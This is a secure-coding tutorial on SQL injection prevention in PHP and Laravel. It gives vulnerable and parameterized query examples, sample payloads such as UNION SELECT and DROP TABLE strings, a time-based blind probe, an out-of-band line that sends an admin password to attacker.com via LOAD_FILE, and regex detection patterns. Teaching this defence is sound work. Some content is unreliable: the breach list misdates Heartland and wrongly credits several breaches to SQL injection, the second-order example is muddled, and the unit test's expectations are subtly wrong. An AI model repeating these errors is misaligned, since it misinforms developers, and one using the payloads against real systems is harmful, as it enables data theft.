# SQL Injection Prevention

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in database queries. Attackers can insert malicious SQL code into queries, potentially allowing them to:

- **Read sensitive data** - Access confidential information
- **Modify data** - Alter or delete database records
- **Execute administrative operations** - Drop tables, create users
- **Bypass authentication** - Login without valid credentials
- **Execute system commands** - In some database systems

### How SQL Injection Happens

SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization.

#### The Vulnerable Pattern
```php
// VULNERABLE: Direct string concatenation
$userId = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $userId;

// If attacker inputs: 1 OR 1=1
// Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
// This returns ALL users!
```

#### Real-World Impact
- **2011 Sony Pictures hack**: 77 million accounts compromised
- **2014 Heartland Payment Systems**: 130 million credit cards stolen
- **2018 Marriott breach**: 500 million guest records exposed
- **2021 T-Mobile hack**: 47 million customer records accessed

## Understanding SQL Injection Types

### 1. Classic SQL Injection
```sql
-- Attacker input: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

### 2. Union-Based Injection
```sql
-- Attacker input: 1 UNION SELECT username, password FROM admin
SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM admin
```

### 3. Blind SQL Injection
```sql
-- No visible results, but timing or boolean responses reveal data
SELECT * FROM users WHERE id = 1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)
```

### 4. Out-of-Band Injection
```sql
-- Data exfiltrated via DNS or HTTP requests
SELECT * FROM users WHERE id = 1 AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM admin), '.attacker.com\\abc'))
```

## PHP Prepared Statements

### The Solution: Parameterized Queries

Prepared statements separate SQL code from data, making injection impossible.

#### Basic Prepared Statement
```php
<?php
// Secure PDO example
$pdo = new PDO("mysql:host=localhost;dbname=test", "user", "pass", [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

$userId = $_GET['id'] ?? 0;

// ✅ SECURE: Prepared statement with parameter binding
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$userId]);
$user = $stmt->fetch();

if ($user) {
    echo "Welcome, " . htmlspecialchars($user['name']);
} else {
    echo "User not found";
}
```

#### Named Parameters
```php
// Using named parameters for clarity
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email AND status = :status");
$stmt->execute([
    'email' => $email,
    'status' => 'active'
]);
```

#### Multiple Parameters
```php
// Insert with multiple parameters
$stmt = $pdo->prepare("INSERT INTO users (name, email, password) VALUES (?, ?, ?)");
$stmt->execute([$name, $email, $hashedPassword]);
```

### mysqli Prepared Statements

```php
<?php
// mysqli alternative
$mysqli = new mysqli("localhost", "user", "pass", "test");

// ✅ SECURE: mysqli prepared statement
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $userId); // "i" for integer
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
```

## Laravel SQL Injection Prevention

### Eloquent ORM Protection

Laravel's Eloquent ORM automatically protects against SQL injection through parameterized queries.

#### Safe Eloquent Queries
```php
<?php
namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class User extends Model
{
    protected $fillable = ['name', 'email', 'password'];

    // ✅ SECURE: Eloquent automatically parameterizes
    public static function findActiveUser($id)
    {
        return self::where('id', $id)
                  ->where('active', true)
                  ->first();
    }

    // ✅ SECURE: Mass assignment protection
    public static function createUser(array $data)
    {
        return self::create($data); // Only fillable fields are used
    }
}
```

#### Query Builder Safety
```php
<?php
use Illuminate\Support\Facades\DB;

// ✅ SECURE: Query Builder automatically parameterizes
$users = DB::table('users')
    ->where('email', $request->email)
    ->where('status', 'active')
    ->get();

// ✅ SECURE: Named bindings
$users = DB::select('SELECT * FROM users WHERE created_at > :date', [
    'date' => now()->subDays(30)
]);
```

### Raw Queries in Laravel

#### DANGER: Raw Queries (When Used Incorrectly)
```php
// ❌ VULNERABLE: Direct string concatenation in Laravel
$userId = $request->id;
$users = DB::select("SELECT * FROM users WHERE id = {$userId}");
// Same vulnerability as PHP direct concatenation!
```

#### SAFE: Raw Queries with Bindings
```php
// ✅ SECURE: Raw queries with proper parameter binding
$userId = $request->id;
$users = DB::select('SELECT * FROM users WHERE id = ?', [$userId]);

// ✅ SECURE: Named parameters
$users = DB::select('SELECT * FROM users WHERE email = :email', [
    'email' => $request->email
]);
```

## Advanced SQL Injection Prevention

### Stored Procedures
```sql
-- Create a stored procedure
DELIMITER //
CREATE PROCEDURE GetUserById(IN user_id INT)
BEGIN
    SELECT * FROM users WHERE id = user_id;
END //
DELIMITER ;

-- Call from PHP (still needs parameter binding)
$stmt = $pdo->prepare("CALL GetUserById(?)");
$stmt->execute([$userId]);
```

### Input Validation Before Queries
```php
<?php
function getUserById($userId) {
    // Validate input type and range
    if (!is_numeric($userId) || $userId <= 0 || $userId > 999999) {
        throw new InvalidArgumentException('Invalid user ID');
    }

    // Now it's safe to use in query
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$userId]);

    return $stmt->fetch();
}
```

### Escaping as Last Resort
```php
<?php
// Only use when prepared statements aren't possible
$userInput = $pdo->quote($userInput); // Adds quotes and escapes

// But this is still vulnerable to certain attacks!
// Always prefer prepared statements
```

## Common SQL Injection Vulnerabilities

### 1. Dynamic Table Names
```php
// ❌ VULNERABLE: Dynamic table name
$table = $_GET['table'];
$query = "SELECT * FROM {$table}";

// ✅ SECURE: Whitelist table names
$allowedTables = ['users', 'products', 'orders'];
if (!in_array($table, $allowedTables)) {
    die('Invalid table');
}
$query = "SELECT * FROM {$table}";
```

### 2. Dynamic Column Names
```php
// ❌ VULNERABLE: Dynamic column
$column = $_GET['sort'];
$query = "SELECT * FROM products ORDER BY {$column}";

// ✅ SECURE: Whitelist columns
$allowedColumns = ['name', 'price', 'created_at'];
if (!in_array($column, $allowedColumns)) {
    $column = 'created_at'; // Default
}
$query = "SELECT * FROM products ORDER BY {$column}";
```

### 3. LIKE Queries
```php
// ❌ VULNERABLE: Direct LIKE query
$search = $_GET['search'];
$query = "SELECT * FROM products WHERE name LIKE '%{$search}%'";

// ✅ SECURE: Prepared statement with wildcards
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
$stmt->execute(["%{$search}%"]);
```

### 4. IN Clauses
```php
// ❌ VULNERABLE: Dynamic IN clause
$ids = $_GET['ids']; // "1,2,3" or "1); DROP TABLE users; --"
$query = "SELECT * FROM users WHERE id IN ({$ids})";

// ✅ SECURE: Prepared statement with multiple parameters
$ids = explode(',', $_GET['ids']);
$placeholders = str_repeat('?,', count($ids) - 1) . '?';
$stmt = $pdo->prepare("SELECT * FROM users WHERE id IN ({$placeholders})");
$stmt->execute($ids);
```

## Database-Specific Considerations

### MySQL
```php
// Set secure PDO options for MySQL
$pdo = new PDO("mysql:host=localhost;dbname=test", "user", "pass", [
    PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4",
    PDO::MYSQL_ATTR_USE_BUFFERED_QUERY => true,
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
]);
```

### PostgreSQL
```php
// PostgreSQL specific options
$pdo = new PDO("pgsql:host=localhost;dbname=test", "user", "pass", [
    PDO::PGSQL_ATTR_DISABLE_PREPARES => false, // Use prepared statements
]);
```

### SQL Server
```php
// SQL Server parameterized queries
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $userId, PDO::PARAM_INT);
$stmt->execute();
```

## Second-Order SQL Injection

### What is Second-Order SQL Injection?
Second-order (or stored) SQL injection occurs when malicious data is stored in the database and later used in a vulnerable query.

```php
<?php
// Step 1: Attacker registers with malicious username
// Username: admin'; --
$username = "admin'; --";
$stmt = $pdo->prepare("INSERT INTO users (username) VALUES (?)");
$stmt->execute([$username]);

// Step 2: Later, vulnerable login query
// ❌ VULNERABLE: Second-order injection
$username = $_POST['username'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = '{$username}' AND password = ?");
$stmt->execute([$password]);

// The stored malicious username breaks out of the query:
// SELECT * FROM users WHERE username = 'admin'; --' AND password = ?
```

### Prevention
```php
<?php
// ✅ SECURE: Use prepared statements everywhere
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// ✅ SECURE: Input validation on storage
function validateUsername($username) {
    if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
        throw new InvalidArgumentException('Invalid username');
    }
    return $username;
}
```

## Testing for SQL Injection

### Manual Testing
```bash
# Test common injection payloads
?id=1'
?id=1''
?id=1 OR 1=1
?id=1; DROP TABLE users; --
?id=1 UNION SELECT * FROM information_schema.tables
```

### Automated Testing Tools
- **SQLMap**: Automated SQL injection testing
- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Manual and automated testing
- **sqlninja**: Microsoft SQL Server specific

### Unit Testing
```php
<?php
class SQLInjectionTest extends TestCase
{
    public function testSQLInjectionPrevention()
    {
        // Test various injection payloads
        $maliciousInputs = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1 UNION SELECT password FROM admin",
        ];

        foreach ($maliciousInputs as $input) {
            $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
            $stmt->execute([$input]);
            $result = $stmt->fetch();

            $this->assertNull($result, "SQL injection not prevented for input: {$input}");
        }
    }
}
```

## Laravel Security Best Practices

### 1. Use Eloquent Relationships
```php
<?php
// ✅ SECURE: Eloquent relationships prevent injection
class Post extends Model
{
    public function user()
    {
        return $this->belongsTo(User::class);
    }
}

// Safe relationship queries
$posts = Post::where('user_id', $userId)->with('user')->get();
```

### 2. Use Route Model Binding
```php
<?php
// ✅ SECURE: Laravel automatically validates and finds model
Route::get('/users/{user}', function (User $user) {
    // $user is automatically resolved and validated
    return $user;
});
```

### 3. Use Form Requests for Complex Validation
```php
<?php
class UpdateUserRequest extends FormRequest
{
    public function rules()
    {
        return [
            'id' => 'required|integer|exists:users,id',
            'name' => 'required|string|max:255',
            'email' => 'required|email|unique:users,email,' . $this->id,
        ];
    }

    public function authorize()
    {
        return $this->user()->can('update', User::find($this->id));
    }
}
```

## Monitoring and Logging

### Log Suspicious Activity
```php
<?php
function logSuspiciousSQL($query, $params, $ip) {
    $suspiciousPatterns = [
        '/;\s*drop/i',
        '/union\s+select/i',
        '/information_schema/i',
        '/load_file/i',
        '/into\s+outfile/i',
    ];

    foreach ($suspiciousPatterns as $pattern) {
        if (preg_match($pattern, $query)) {
            error_log("Suspicious SQL detected from {$ip}: {$query}");
            // Could also send alerts or block IP
            break;
        }
    }
}
```

### Database Query Logging
```php
// Laravel query logging
DB::listen(function ($query) {
    Log::info('SQL Query', [
        'sql' => $query->sql,
        'bindings' => $query->bindings,
        'time' => $query->time,
    ]);
});
```

## Summary: SQL Injection Prevention Rules

1. **Never concatenate user input into SQL queries**
2. **Always use prepared statements with parameter binding**
3. **Use allow-lists for dynamic table/column names**
4. **Validate and sanitize all input before database operations**
5. **Use ORM features (Eloquent) when possible**
6. **Implement proper error handling without exposing information**
7. **Log and monitor database queries for suspicious activity**
8. **Keep database drivers and frameworks updated**
9. **Use least privilege database accounts**
10. **Regular security testing and code reviews**

## Next Steps

Now that you understand SQL injection prevention, explore:

- **[Input Handling](InputHandling.md)** - Learn about input validation and sanitization
- **[Authentication & Password Handling](AuthenticationPasswordHandling.md)** - Secure user authentication
- **[Secure Coding Basics](SecureCodingBasics.md)** - Overall security principles

Remember: SQL injection is one of the most dangerous vulnerabilities. Always use prepared statements and never trust user input!
